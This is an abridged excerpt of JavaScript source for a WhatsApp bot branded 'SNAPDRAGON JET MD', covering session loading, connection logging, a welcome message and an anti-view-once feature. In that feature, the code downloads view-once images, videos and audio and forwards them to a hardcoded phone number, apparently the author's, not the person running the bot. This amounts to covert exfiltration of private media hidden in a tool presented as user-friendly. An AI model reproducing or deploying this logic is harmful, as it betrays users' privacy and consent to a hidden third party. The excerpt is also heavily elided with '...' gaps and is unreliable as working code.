const {
  ...
  const ownerNumber = ['254704009677']
...
const sessdata = config.SESSION_ID.replace("Snapdragon~", '');
...
console.log("Session downloaded ✅")
  ...
  console.log("Connecting SNAPDRAGON MD to WhatsApp ⏳️...");
  ...
  console.log('🧬 Installing SNAPDRAGON JET MD Plugins')
  const path = require('path');
  ...
  let up = `*Hello there ✦ SNAPDRAGON ✦ JET ✦ MD ✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by SNAPDRAGON TECH INC. \ud83c\udf8a, Meet ✦ SNAPDRAGON MD ✦ WhatsApp Bot.\n\n *Thanks for using ✦ SNAPDRAGON ✦ JET MD ✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- ✈️\n \nhttps://whatsapp.com/channel/0029Vb6jFwj89ine3b7qHB1y\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Viniznimco/VINIZIAZ-LION\n\n> © Powered BY ✦ SNAPDRAGON ✦ MD ✦ \ud83d\udda4`;
  conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/xb17f0.jpg` }, caption: up })
  }
  })
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("254704009677@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("254704009677@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("254704009677@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
...
if (!isReact && senderNumber === botNumber) {
  ...
  app.get("/", (req, res) => {
  res.send("SNAPDRAGON JET MD RUNNING 🔥");
  });
